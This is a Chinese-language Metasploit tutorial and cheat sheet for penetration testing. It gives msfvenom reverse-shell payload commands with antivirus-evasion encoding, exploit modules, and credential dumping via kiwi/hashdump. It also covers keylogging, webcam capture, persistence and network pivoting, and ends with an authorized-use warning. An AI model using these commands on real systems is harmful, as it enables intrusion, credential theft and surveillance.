# Metasploit 使用指南

> Metasploit Framework（MSF）是最流行的渗透测试框架，集成了大量漏洞利用模块、辅助模块和 Payload，是渗透测试的利器。

---

## 目录

- [一、Metasploit 简介](#一metasploit-简介)
- [二、安装与启动](#二安装与启动)
- [三、基本架构](#三基本架构)
- [四、MSFconsole 使用](#四msfconsole-使用)
- [五、常用模块](#五常用模块)
- [六、Payload 与监听](#六payload-与监听)
- [七、Meterpreter](#七meterpreter)
- [八、后渗透操作](#八后渗透操作)
- [九、提权](#九提权)
- [十、内网穿透](#十内网穿透)
- [十一、常用命令速查](#十一常用命令速查)

---

## 一、Metasploit 简介

Metasploit 是 Rapid7 公司开发的渗透测试框架，是全球最流行的安全测试工具之一。

**版本**：
- **Community**：社区版（免费）
- **Pro**：专业版（付费，更多功能）
- **Framework**：框架（开源免费，命令行）

**主要功能**：
- 漏洞利用（Exploit）
- Payload 生成
- 后渗透攻击（Post-Exploitation）
- 社工（Social Engineering）
- 免杀（Payload 编码/加密）
- 内网渗透
- 凭证窃取

---

## 二、安装与启动

### 2.1 Kali Linux（自带）

```bash
# 启动 PostgreSQL 数据库
sudo systemctl start postgresql

# 初始化数据库
sudo msfdb init

# 启动 MSF
msfconsole
```

### 2.2 其他系统

```bash
# 下载安装
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### 2.3 启动

```bash
# 启动控制台
msfconsole

# 静默启动（不显示 banner）
msfconsole -q

# 执行命令后退出
msfconsole -x "search ms17-010"
```

### 2.4 更新

```bash
# 更新 Metasploit
msfupdate
```

---

## 三、基本架构

```
Metasploit Framework
├── Exploits     # 漏洞利用模块（利用漏洞获取权限）
├── Payloads     # 攻击载荷（漏洞利用后执行的代码）
│   ├── Singles   # 单个 Payload（独立）
│   ├── Stagers   # 传输器（建立连接）
│   └── Stages    # 传输体（Stager 下载的功能模块）
├── Auxiliary    # 辅助模块（扫描、枚举、爆破等）
├── Post         # 后渗透模块（拿到权限后的操作）
├── Encoders     # 编码模块（免杀、绕过检测）
├── Nops         # 空指令模块
└── Evasion      # 逃避模块（绕过 AV/EDR）
```

**常用 Payload 类型**：
- **bind_tcp**：正向连接（攻击机 → 目标机）
- **reverse_tcp**：反向连接（目标机 → 攻击机）
- **reverse_http/https**：HTTP/HTTPS 反向连接
- **meterpreter**：高级 Payload，功能丰富

---

## 四、MSFconsole 使用

### 4.1 界面

```
msf6 >
```

提示符中的数字是版本号（msf6 表示第 6 代）。

### 4.2 基本命令

| 命令 | 说明 |
|------|------|
| `help` / `?` | 帮助 |
| `search` | 搜索模块 |
| `use` | 使用模块 |
| `info` | 查看模块信息 |
| `show` | 显示信息（options、payloads 等） |
| `set` | 设置参数 |
| `unset` | 取消参数 |
| `setg` | 设置全局参数 |
| `unsetg` | 取消全局参数 |
| `run` / `exploit` | 运行模块 |
| `back` | 返回上一级 |
| `exit` / `quit` | 退出 |
| `banner` | 显示 banner |
| `history` | 命令历史 |

### 4.3 搜索模块

```bash
# 搜索关键字
msf6 > search ms17-010
msf6 > search eternalblue
msf6 > search mysql

# 按类型搜索
msf6 > search type:auxiliary mysql
msf6 > search type:exploit windows

# 按平台搜索
msf6 > search platform:windows smb
msf6 > search platform:linux tomcat

# 组合搜索
msf6 > search type:exploit platform:windows smb
```

**结果列说明**：
- `#` — 序号
- `Name` — 模块名称
- `Disclosure Date` — 披露日期
- `Rank` — 评级（excellent > great > good > normal > average > low）
- `Check` — 是否支持 check 命令
- `Description` — 描述

### 4.4 使用模块

```bash
# 使用模块（完整路径）
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 或用序号
msf6 > use 0

# 查看模块信息
msf6 exploit(...) > info

# 查看需要设置的参数
msf6 exploit(...) > show options

# 设置参数
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set LHOST 192.168.1.1
msf6 exploit(...) > set LPORT 4444

# 查看可用 payload
msf6 exploit(...) > show payloads

# 设置 payload
msf6 exploit(...) > set payload windows/x64/meterpreter/reverse_tcp

# 运行
msf6 exploit(...) > run
msf6 exploit(...) > exploit

# 运行并后台执行
msf6 exploit(...) > run -j
```

### 4.5 会话管理

```bash
# 查看所有会话
msf6 > sessions

# 进入指定会话
msf6 > sessions -i 1

# 后台会话（在 Meterpreter 中）
meterpreter > background

# 杀死会话
msf6 > sessions -k 1

# 升级会话（将普通 Shell 升级为 Meterpreter）
msf6 > sessions -u 1
```

---

## 五、常用模块

### 5.1 辅助模块（Auxiliary）

**扫描/枚举**：
```bash
# 端口扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# SMB 扫描
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# MS17-010 检测
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# MySQL 空密码
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.0/24
set USERNAME root
set PASSWORD ''
run

# FTP 匿名登录
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.0/24
run

# SSH 版本扫描
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run
```

### 5.2 漏洞利用模块（Exploit）

**Windows 常见漏洞**：
```bash
# MS17-010 永恒之蓝
use exploit/windows/smb/ms17_010_eternalblue

# MS08-067
use exploit/windows/smb/ms08_067_netapi

# BlueKeep (CVE-2019-0708)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**Web 漏洞**：
```bash
# Struts2
use exploit/multi/http/struts2_namespace_ognl

# Tomcat
use exploit/multi/http/tomcat_mgr_upload

# Jenkins
use exploit/multi/http/jenkins_script_console
```

---

## 六、Payload 与监听

### 6.1 常用 Payload

**Windows**：
```
windows/meterpreter/reverse_tcp         # 32位 Meterpreter 反向 TCP
windows/x64/meterpreter/reverse_tcp     # 64位 Meterpreter 反向 TCP
windows/meterpreter/reverse_https       # 反向 HTTPS
windows/shell/reverse_tcp               # 普通 Shell
windows/shell_bind_tcp                  # 正向 Shell
```

**Linux**：
```
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp
```

**Java / 多平台**：
```
java/meterpreter/reverse_tcp
php/meterpreter/reverse_tcp
python/meterpreter/reverse_tcp
```

### 6.2 生成 Payload（msfvenom）

msfvenom 用于生成各种格式的 Payload 文件。

**基本语法**：
```bash
msfvenom -p <payload> <options> -f <format> -o <output>
```

**Windows EXE**：
```bash
# 32位
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o shell.exe

# 64位
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o shell64.exe
```

**Linux ELF**：
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -o shell64.elf
```

**PHP Webshell**：
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o shell.php
```

**Python**：
```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o shell.py
```

**Java WAR**：
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f war -o shell.war
```

**脚本类**：
```bash
# bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.1 LPORT=4444 -f raw

# Python
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.1 LPORT=4444 -f raw

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.1 LPORT=4444 -f raw
```

### 6.3 编码与免杀

```bash
# 列出可用编码器
msfvenom -l encoders

# 使用编码器
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# 多重编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -e x86/shikata_ga_nai -i 10 \
         -e x86/countdown -i 5 \
         -f exe -o multi_encoded.exe
```

**常用编码器**：
- `x86/shikata_ga_nai` — 多边形编码（最经典）
- `x86/fnstenv_mov` — FPU 指令
- `x86/countdown` — 倒计时
- `x86/alpha_mixed` — 字母数字混合

### 6.4 设置监听（handler）

```bash
# 开启监听
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run -j  # 后台运行

# 或简写
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run -j"
```

---

## 七、Meterpreter

Meterpreter 是 Metasploit 的高级 Payload，功能非常强大。

### 7.1 基本命令

```bash
# 帮助
meterpreter > help

# 系统信息
meterpreter > sysinfo

# 当前用户
meterpreter > getuid

# 进程列表
meterpreter > ps

# 当前进程 ID
meterpreter > getpid

# 迁移进程
meterpreter > migrate 1234
meterpreter > migrate -N explorer.exe

# 进入 Shell
meterpreter > shell

# 退出 Meterpreter
meterpreter > exit

# 后台运行
meterpreter > background
```

### 7.2 文件操作

```bash
# 查看当前目录
meterpreter > pwd

# 列出文件
meterpreter > ls

# 切换目录
meterpreter > cd C:\\

# 上传文件
meterpreter > upload /local/path C:\\remote\\path

# 下载文件
meterpreter > download C:\\remote\\path /local/path

# 查看文件内容
meterpreter > cat C:\\test.txt

# 搜索文件
meterpreter > search -f *.doc -d C:\\Users

# 创建目录
meterpreter > mkdir C:\\test

# 删除文件
meterpreter > rm C:\\test.txt
```

### 7.3 网络操作

```bash
# 查看网络配置
meterpreter > ipconfig
meterpreter > ifconfig

# 查看路由表
meterpreter > route

# 端口转发
meterpreter > portfwd add -l 3306 -p 3306 -r 192.168.1.100

# 查看 ARP 表
meterpreter > arp

# 查看网络连接
meterpreter > netstat
```

### 7.4 系统操作

```bash
# 关机
meterpreter > shutdown

# 重启
meterpreter > reboot

# 注销
meterpreter > logoff

# 挂起
meterpreter > suspend
```

---

## 八、后渗透操作

### 8.1 凭证窃取

```bash
# 加载 mimikatz
meterpreter > load kiwi

# 抓取明文密码（需要 SYSTEM 权限）
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# 哈希转储
meterpreter > run post/windows/gather/hashdump

# 键盘记录
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```

### 8.2 权限提升

```bash
# 尝试 getsystem（多种提权方法自动尝试）
meterpreter > getsystem

# 查看系统信息
meterpreter > sysinfo

# 查看权限
meterpreter > getprivs

# 本地提权模块（在 MSF 中搜索）
msf6 > search type:exploit platform:windows local privilege
```

### 8.3 持久化

```bash
# 服务方式
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.1

# 启动项
meterpreter > run persistence -U -i 60 -p 4444 -r 192.168.1.1

# 详细参数
meterpreter > run persistence -h
```

### 8.4 屏幕截图与摄像头

```bash
# 截图
meterpreter > screenshot

# 开启远程桌面
meterpreter > run post/windows/manage/enable_rdp

# 摄像头列表
meterpreter > webcam_list

# 拍照
meterpreter > webcam_snap

# 摄像头直播
meterpreter > webcam_stream
```

---

## 九、提权

### 9.1 Windows 提权

**方法 1：getsystem（自动尝试）**
```bash
meterpreter > getsystem
```

**方法 2：溢出漏洞提权**
```bash
# 查看系统补丁，判断可利用漏洞
meterpreter > run post/windows/gather/enum_patches

# 搜索对应 exploit
msf6 > search ms16_032
msf6 > search cve-2021-40449
```

**方法 3：错误服务配置**
```bash
# 枚举服务
meterpreter > run post/windows/gather/enum_services

# 查找可写的服务
meterpreter > run exploit/windows/local/service_permissions
```

### 9.2 Linux 提权

```bash
# 枚举系统信息
meterpreter > run post/linux/gather/enum_system

# 检查可写文件
meterpreter > run post/linux/gather/enum_configs

# 脏牛提权等
msf6 > search dirtycow
```

---

## 十、内网穿透

### 10.1 添加路由

```bash
# 查看内网网段
meterpreter > run get_local_subnets

# 在 MSF 中添加路由（让其他模块也能访问内网）
msf6 > route add 192.168.10.0 255.255.255.0 1
# 网段         子网掩码        会话ID

# 查看路由
msf6 > route print

# 删除路由
msf6 > route del 192.168.10.0 255.255.255.0
```

### 10.2 端口转发

```bash
# 转发本地端口到内网机器
meterpreter > portfwd add -l 3306 -p 3306 -r 192.168.10.100
#              本地端口   远程端口    远程主机

# 查看转发列表
meterpreter > portfwd list

# 删除转发
meterpreter > portfwd delete -l 3306
```

### 10.3 SOCKS 代理

```bash
# 使用 MSF 自带 socks 模块
use auxiliary/server/socks_proxy
set SRVHOST 0.0.0.0
set SRVPORT 1080
set VERSION 5
run -j

# 然后在本地配置代理使用
# 浏览器/工具设置 SOCKS5 代理 127.0.0.1:1080
```

### 10.4 内网扫描

```bash
# 添加路由后，可以直接使用 MSF 模块扫描内网
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.10.0/24
set PORTS 22,80,445,3306
set THREADS 20
run
```

---

## 十一、常用命令速查

### 11.1 MSF 常用命令

```bash
# 搜索模块
search <keyword>

# 使用模块
use <module_path>

# 查看选项
show options

# 设置参数
set RHOSTS 192.168.1.100
set LHOST 192.168.1.1
set LPORT 4444

# 设置 payload
set payload windows/x64/meterpreter/reverse_tcp

# 运行
run
exploit
run -j   # 后台

# 会话管理
sessions
sessions -i 1
sessions -k 1
```

### 11.2 Meterpreter 常用命令

```bash
# 系统
sysinfo
getuid
getpid
ps

# 进程迁移
migrate <pid>
migrate -N explorer.exe

# 文件
ls
cd
pwd
upload /local /remote
download /remote /local
cat file
search -f *.txt -d /path

# 网络
ipconfig
route
arp
netstat
portfwd add -l 3306 -p 3306 -r target

# 提权
getsystem
getprivs

# 凭证
load kiwi
creds_all
hashdump

# 其他
screenshot
keyscan_start
keyscan_dump
shell
background
exit
```

### 11.3 msfvenom 常用命令

```bash
# Windows EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Windows 64位
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell64.exe

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# 编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

---

> ⚠️ **安全提示**：Metasploit 是强大的渗透测试工具，仅可用于授权测试。未经授权使用属于违法行为。

> **延伸学习**：Metasploit 功能非常庞大，建议先掌握基本的 exploit/multi/handler 和 Meterpreter 操作，然后逐步学习各种漏洞模块和后渗透技巧。
